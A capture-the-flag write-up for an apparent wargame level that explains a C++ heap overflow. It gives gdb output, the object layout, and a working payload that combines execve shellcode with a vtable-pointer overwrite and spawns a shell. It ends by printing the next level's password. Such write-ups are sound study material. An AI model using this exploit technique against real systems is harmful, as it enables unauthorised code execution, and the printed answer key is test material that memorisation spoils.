solution level9:

-> our main exits if we don't provide the program with at least one argument

-> 2 objects of type N are allocated on the heap with the new operator
we can check their addresses:
(gdb) b *0x08048664
(gdb) run "ok"
(gdb) x $esp+0x10
0xbffff6e0:	0x0804a078
(gdb) x $esp+0x14
0xbffff6e4:	0x0804a008
There is an offset of 112 bytes between the two addresses.
At these addresses is a vptr (virtual pointer) set in the constructor to 0x08048848, which is the location of the virtual table for type N off by 8 bytes.
(gdb) x 0x08048848
0x8048848 <vtable for N+8>:	0x0804873a
The vptr points to the method called "_ZN1NplERS_", which is actually the virtual operator + of N.

-> the method "setAnnotation" is called on the first instance with argv[1] as parameter
This method uses memcpy, with the address of our instance + 4 bytes as destination, and argv[1] as source.
From disassembling the methods and constructor of class N, we deduce the content of an instance:
- virtual pointer (vptr), set to 0x08048848, pointing to operator +
- buffer of 100 bytes
- an int (4 bytes), initialized with the one we send to the constructor

-> next, main stores the address pointed to by the vptr of the second instance in register edx
This essentially puts the address of method "_ZN1NplERS_" in edx.

-> finally the program calls the function stored in edx

-> our instances are only 112 bytes apart, so we can overwrite into the second instance, into its vptr and buffer, with the memcpy method, before the program calls edx

-> there are no calls to system, or execve, or anything that could give us access to a shell, but we can inject a shellcode in the buffer

-> our buffer will write into the second instance after 112 - 4 = 108 bytes
We will fill our first buffer until we reach the second instance, and change some addresses so that edx points to our shellcode.

-> our buffer contains:
* the shellcode //(21 bytes) located at address 0x0804a008 + 4 bytes = 0x0804a00c
* 87 bytes //to reach address 0x0804a078 
* 0x0804a07c //address 0x0804a078 (vptr of second instance) -> overwrite its content with 0x0804a07c
* 0x0804a00c //address 0x0804a07c (buffer of our second instance) -> overwrite its content with 0x0804a00c (shellcode)

> ./level9 `perl -e 'print "\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80" . "A" x 87 . "\x7c\xa0\x04\x08" . "\x0c\xa0\x04\x08"'`
> $ cat /home/user/bonus0/.pass
f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728
